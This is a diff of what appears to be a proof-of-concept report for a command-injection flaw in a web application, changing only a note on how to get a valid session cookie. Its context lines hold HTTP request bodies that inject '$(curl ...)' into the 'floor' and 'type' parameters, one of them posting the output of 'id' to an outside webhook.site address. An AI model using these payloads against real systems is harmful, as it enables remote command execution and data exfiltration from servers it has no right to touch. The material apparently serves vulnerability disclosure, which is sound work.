@@ -10,7 +10,7 @@ Content-Length: 88
 Origin: https://xxx
 Connection: close
 Referer: xxx
-Cookie: aamks=(need a valid one just go to register.php and create an account)
+Cookie: aamks=(need a valid one just go to login.php?register and create an account)
 
 type=png&floor=$(curl https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b)
 
@@ -28,6 +28,6 @@ Content-Length: 90
 Origin: https://xxx
 Connection: close
 Referer: xxx
-Cookie: aamks=(need a valid one just go to register.php and create an account)
+Cookie: aamks=(need a valid one just go to login.php?register and create an account)
 
 floor=$(curl -X POST https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b -d "$(id)")
